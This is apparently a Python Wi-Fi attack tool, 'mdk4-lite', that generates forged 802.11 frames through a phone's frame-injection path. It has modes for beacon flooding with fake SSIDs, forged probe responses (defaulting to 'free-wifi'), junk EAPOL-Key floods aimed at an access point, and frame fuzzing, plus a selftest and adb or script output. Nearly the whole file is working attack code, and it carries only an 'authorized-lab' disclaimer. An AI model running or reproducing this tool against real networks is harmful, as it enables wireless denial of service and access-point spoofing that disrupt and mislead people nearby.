#!/usr/bin/env python3
"""mdk4-lite: research-frame generators on the frame-inject monitor path
(fills the mdk4/Kismet absence from termux sources).

Modes:
  beacon-flood  fake AP beacons (--ssid / --ssid-file / random, --count)
  probe-resp    forged probe responses from a fake AP
  eapol-flood   junk EAPOL-Key M1 frames toward an AP
  fuzz          structurally-valid random mgmt/control/data frames
                (driver parse is fail-closed: garbage is rejected, not sent)

All modes go through replay_lib pacing: bursts above the completion rate
drop silently (queue-accept). Keep --pps modest; status 3 = no ACK is a
normal outcome for broadcast forged traffic.

Authorized-lab use only; same constraints as the rest of this repo.
"""
import argparse
import os
import random
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from replay_lib import Sender, wrap_body  # noqa: E402

BCAST = "ffffffffffff"


def _mac_bytes(s):
    return bytes.fromhex(s.replace(":", ""))


def _rand_mac(rng):
    # locally-administered, unicast
    return bytes([0x02, rng.randrange(256), rng.randrange(256),
                  rng.randrange(256), rng.randrange(256), rng.randrange(256)])


def seq_hdr(fc, addr1, addr2, addr3, seq, rng):
    dur = rng.randrange(0, 32768) & ~0xC000
    return struct.pack("<HH", fc, dur) + addr1 + addr2 + addr3 + \
        struct.pack("<H", (seq % 4096) << 4)


def beacon_frame(ap_mac, ssid, chan, rng, seq=0):
    fc = 0x0080  # beacon
    body = seq_hdr(fc, _mac_bytes(BCAST), ap_mac, ap_mac, seq, rng)
    fixed = struct.pack("<Q", 0) + struct.pack("<H", 100) + \
        struct.pack("<H", 0x0431)  # ts, interval, cap ESS+short-slot
    tags = b"\x00" + bytes([len(ssid)]) + ssid
    tags += b"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"  # rates
    tags += b"\x03\x01" + bytes([chan])
    return body + fixed + tags


def probe_resp_frame(ap_mac, ssid, chan, rng, seq=0):
    fc = 0x0050  # probe response
    body = seq_hdr(fc, _mac_bytes(BCAST), ap_mac, ap_mac, seq, rng)
    fixed = struct.pack("<Q", 0) + struct.pack("<H", 100) + \
        struct.pack("<H", 0x0431)
    tags = b"\x00" + bytes([len(ssid)]) + ssid
    tags += b"\x03\x01" + bytes([chan])
    return body + fixed + tags


def eapol_junk_frame(bssid, client, rng, seq=0):
    fc = 0x0808  # data ToDS
    hdr = seq_hdr(fc, _mac_bytes(bssid), _mac_bytes(client),
                  _mac_bytes(bssid), seq, rng)
    nonce = bytes(rng.randrange(256) for _ in range(32))
    key = b"\x02" + struct.pack(">H", 0x0108) + b"\x00\x00" + \
        b"\x00" * 8 + nonce + b"\x00" * 56
    eapol = b"\x03\x03" + struct.pack(">H", len(key)) + key
    return hdr + b"\xaa\xaa\x03\x00\x00\x00\x88\x8e" + eapol


def fuzz_frame(rng):
    kinds = [0x0080, 0x0050, 0x0040, 0x00b0, 0x00c0, 0x0808, 0x0880]
    fc = rng.choice(kinds) | (rng.randrange(4) << 11)  # random frag bits ok
    body = seq_hdr(fc, _rand_mac(rng), _rand_mac(rng), _rand_mac(rng),
                   rng.randrange(4096), rng)
    pad = rng.randrange(0, 40)
    return body + bytes(rng.randrange(256) for _ in range(pad))


def selftest():
    failures = []
    rng = random.Random(7)

    def check(name, ok):
        print("%-38s %s" % (name, "OK" if ok else "FAIL"))
        if not ok:
            failures.append(name)

    b = beacon_frame(_rand_mac(rng), b"test", 6, rng)
    check("beacon_fc_subtype", int.from_bytes(b[0:2], "little") == 0x0080)
    check("beacon_addr_bcast", b[4:10] == _mac_bytes(BCAST))
    check("beacon_len_ge_min", len(b) >= 24 + 12 + 6)
    check("beacon_ssid_tag", b"\x00\x04test" in b)

    p = probe_resp_frame(_rand_mac(rng), b"pr", 11, rng)
    check("proberesp_fc", int.from_bytes(p[0:2], "little") == 0x0050)

    e = eapol_junk_frame("020000000001", "020000000002", rng)
    check("eapol_data_tods", int.from_bytes(e[0:2], "little") == 0x0808)
    check("eapol_llc", e[24:32] == b"\xaa\xaa\x03\x00\x00\x00\x88\x8e")
    check("eapol_keyinfo_m1", int.from_bytes(e[37:39], "big") == 0x0108)
    check("eapol_len_field", int.from_bytes(e[34:36], "big") == len(e) - 36)

    f = fuzz_frame(rng)
    check("fuzz_min_len", len(f) >= 24)
    check("fuzz_fc_type_valid", (int.from_bytes(f[0:2], "little") >> 10) < 4)

    print("SELFTEST %s (%d failures)" % (
        "PASS" if not failures else "FAIL", len(failures)))
    return 1 if failures else 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", nargs="?", choices=["beacon-flood", "probe-resp",
                                                "eapol-flood", "fuzz"])
    ap.add_argument("--pps", type=float, default=4.0)
    ap.add_argument("--count", type=int, default=10)
    ap.add_argument("--mode-out", choices=["dryrun", "adb", "script"],
                    default="dryrun", dest="send_mode")
    ap.add_argument("--out", help="script path (send-mode=script)")
    ap.add_argument("--ssid")
    ap.add_argument("--ssid-file")
    ap.add_argument("--bssid")
    ap.add_argument("--client", default="020000000002")
    ap.add_argument("--channel", type=int, default=6)
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        return selftest()

    rng = random.Random(args.seed)
    ssids = []
    if args.ssid_file:
        ssids = [l.strip().encode() for l in open(args.ssid_file)
                 if l.strip()]
    elif args.ssid:
        ssids = [args.ssid.encode()]
    bssid = args.bssid or _rand_mac(rng).hex()

    sender = Sender(mode=args.send_mode, pps=args.pps)
    if args.send_mode == "adb":
        sender.ensure_pushed()

    for i in range(args.count):
        if args.mode == "beacon-flood":
            ap_mac = (_mac_bytes(bssid) if args.bssid else _rand_mac(rng))
            ssid = rng.choice(ssids) if ssids else \
                ("net-%04d" % rng.randrange(10000)).encode()
            frame = beacon_frame(ap_mac, ssid, args.channel, rng, seq=i)
            note = "ssid=%s bssid=%s" % (ssid.decode(errors="replace"),
                                         ap_mac.hex())
        elif args.mode == "probe-resp":
            ssid = rng.choice(ssids) if ssids else b"free-wifi"
            frame = probe_resp_frame(_mac_bytes(bssid), ssid,
                                     args.channel, rng, seq=i)
            note = "probe-resp bssid=%s" % bssid
        elif args.mode == "eapol-flood":
            frame = eapol_junk_frame(bssid, args.client, rng, seq=i)
            note = "eapol-m1 %s->%s" % (args.client, bssid)
        else:
            frame = fuzz_frame(rng)
            note = "fuzz"
        print(sender.send_frame(wrap_body(frame), note=note))

    if args.send_mode == "script":
        if not args.out:
            ap.error("--out required with send-mode script")
        sender.write_script(args.out)
        print("script written: %s" % args.out)
    print("generated=%d mode=%s" % (args.count, args.send_mode))
    return 0


if __name__ == "__main__":
    sys.exit(main())
